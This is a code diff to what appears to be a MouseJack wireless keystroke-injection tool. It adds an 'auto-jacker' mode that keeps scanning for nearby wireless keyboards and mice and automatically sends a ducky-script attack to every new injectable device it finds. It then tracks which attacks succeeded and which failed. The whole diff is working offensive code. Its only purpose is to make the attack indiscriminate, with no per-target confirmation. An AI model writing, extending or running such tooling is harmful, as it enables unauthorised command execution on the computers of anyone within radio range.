@@ -50,6 +50,7 @@ def launch_attacks(jack, targets, attack, use_ping=True):
                 print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
                 print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), lock_channel))
                 jack.attack(hid(address, payload), attack)
+                return True
             else:
                 # If our pings fail, go full hail mary
                 print(R + '[-] ' + W + 'Ping failed, trying all channels')
@@ -57,9 +58,20 @@ def launch_attacks(jack, targets, attack, use_ping=True):
                     jack.set_channel(channel)
                     print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (addr_string, hid.description(), channel))
                     jack.attack(hid(address, payload), attack)
+                return True
         else:
             print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (addr_string))
-            continue
+            return False
+
+
+def auto_attack_single_device(jack, addr_string, device, attack):
+    """Attack a single device and return success status"""
+    targets = {addr_string: device}
+    try:
+        return launch_attacks(jack, targets, attack)
+    except Exception as e:
+        print(R + '[-] ' + W + f'Attack failed on {addr_string}: {str(e)}')
+        return False
 
 
 def scan_loop(jack, interval, targeted, address):
@@ -92,6 +104,91 @@ def scan_loop(jack, interval, targeted, address):
         ])
 
     print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "PACKET"]))
+
+
+def auto_jacker_scan_loop(jack, interval, targeted, address, attack, attacked_devices):
+    """Enhanced scan loop that automatically attacks new devices"""
+    if targeted:
+        jack.sniff(interval, address)
+    else:
+        jack.scan(interval)
+
+    click.clear()
+    if targeted:
+        print(GR + "[+] " + W + ("Auto-jacking %s every %ds " % (address, interval)) + G + "CTRL-C " + W + "to stop.")
+    else:
+        print(GR + "[+] " + W + ("Auto-jacking devices every %ds " % interval) + G + "CTRL-C " + W + "to stop.")
+    print("")
+
+    # Check for new devices to attack
+    new_attacks = 0
+    for addr_string, device in iteritems(jack.devices):
+        if addr_string not in attacked_devices and device['device']:
+            print(O + '[*] ' + W + f'New device detected: {addr_string} [{device["device"].description()}]')
+            print(O + '[*] ' + W + f'Launching attack on {addr_string}...')
+            
+            success = auto_attack_single_device(jack, addr_string, device, attack)
+            
+            if success:
+                attacked_devices[addr_string] = {
+                    'status': 'SUCCESS',
+                    'timestamp': time.time(),
+                    'attempts': 1
+                }
+                print(G + '[+] ' + W + f'Attack successful on {addr_string}')
+                new_attacks += 1
+            else:
+                attacked_devices[addr_string] = {
+                    'status': 'FAILED',
+                    'timestamp': time.time(),
+                    'attempts': 1
+                }
+                print(R + '[-] ' + W + f'Attack failed on {addr_string}')
+        elif addr_string in attacked_devices and device['device']:
+            # Device already attacked, just update the attempt count if needed
+            pass
+
+    # Display device table with attack status
+    pretty_devices = []
+    for addr_string, device in iteritems(jack.devices):
+        if device['device']:
+            device_name = device['device'].description()
+        else:
+            device_name = 'Unknown'
+        
+        # Add attack status
+        if addr_string in attacked_devices:
+            status = attacked_devices[addr_string]['status']
+            if status == 'SUCCESS':
+                status_color = G + status + W
+            else:
+                status_color = R + status + W
+            attack_time = str(datetime.timedelta(seconds=int(time.time() - attacked_devices[addr_string]['timestamp']))) + ' ago'
+        else:
+            if device['device']:
+                status_color = O + 'PENDING' + W
+                attack_time = 'Not attacked'
+            else:
+                status_color = GR + 'NOT INJECTABLE' + W
+                attack_time = 'Skipped'
+        
+        pretty_devices.append([
+            device['index'],
+            addr_string,
+            ",".join(str(x) for x in device['channels']),
+            device['count'],
+            str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
+            device_name,
+            status_color,
+            attack_time
+        ])
+
+    print(tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "TYPE", "ATTACK STATUS", "LAST ATTACK"]))
+    
+    if new_attacks > 0:
+        print(f"\n{G}[+]{W} Launched {new_attacks} new attack(s) this scan")
+    
+    print(f"\n{GR}[INFO]{W} Total devices: {len(jack.devices)} | Attacked: {len([k for k, v in attacked_devices.items() if v['status'] == 'SUCCESS'])} | Failed: {len([k for k, v in attacked_devices.items() if v['status'] == 'FAILED'])}")
 
 
 def _print_err(text):
@@ -130,9 +227,10 @@ def confirm_root():
 @click.option('--vendor', default="", help="Vendor of device to target (required when specifying address)")
 @click.option('--reset', is_flag=True, help="Reset CrazyPA dongle prior to initalization")
 @click.option('--autopwn', is_flag=True, help="Automatically find and attack all targets")
+@click.option('--auto-jacker', is_flag=True, help="Automatically attack devices as they are detected")
 @click.option('--all-channels', is_flag=True, help="Send attack to all detected channels")
 @click.option('--keylogging', is_flag=True, help="Log keystrokes for XOR encrypted MS keyboards")
-def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, all_channels, keylogging):
+def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autopwn, auto_jacker, all_channels, keylogging):
 
     banner()
     confirm_root()
@@ -156,7 +254,7 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autop
             targeted = True
 
     if script == "":
-        if not keylogging:
+        if not keylogging and not auto_jacker:
             _print_err("You must supply a ducky script using --script <filename>")
             _print_err("Attacks are disabled.")
         attack = ""
@@ -200,6 +298,43 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset, autop
                 else:
                     _print_err('No devices found')
                 jack.clear_devices()
+
+        # New auto-jacker mode
+        if auto_jacker:
+            if not attack:
+                _print_err('No attack script specified for auto-jacker. Exiting.')
+                exit(-1)
+
+            print(G + "[+] " + W + 'Starting auto-jacker mode...')
+            print(GR + "[INFO] " + W + 'Devices will be attacked automatically as they are detected.')
+            print(GR + "[INFO] " + W + 'Press CTRL-C to stop.')
+            print("")
+
+            attacked_devices = {}  # Track which devices have been attacked
+            
+            if targeted:
+                print(G + "[+] " + W + 'Starting targeted sniff for %s...' % address)
+                if vendor.startswith("l"):
+                    jack.add_device(address, [0, 0xC2, 0, 0, 0, 0, 0, 0, 0, 0])
+                if vendor.startswith("m"):
+                    jack.add_device(address, [])
+                if vendor.startswith("a"):
+                    jack.add_device(address, [0, 0, 0, 0, 0, 0])
+            else:
+                print(G + "[+] " + W + 'Starting auto-jacker scan...')
+
+            try:
+                while True:
+                    auto_jacker_scan_loop(jack, interval, targeted, address, attack, attacked_devices)
+                    time.sleep(0.5)  # Small delay to prevent excessive CPU usage
+            except KeyboardInterrupt:
+                print(f"\n\n{G}[+]{W} Auto-jacker stopped.")
+                print(f"{GR}[SUMMARY]{W} Total devices attacked: {len(attacked_devices)}")
+                successful_attacks = len([k for k, v in attacked_devices.items() if v['status'] == 'SUCCESS'])
+                failed_attacks = len([k for k, v in attacked_devices.items() if v['status'] == 'FAILED'])
+                print(f"{GR}[SUMMARY]{W} Successful attacks: {successful_attacks}")
+                print(f"{GR}[SUMMARY]{W} Failed attacks: {failed_attacks}")
+                exit(0)
 
         if targeted:
             print(G + "[+] " + W + 'Starting sniff for %s...' % address)
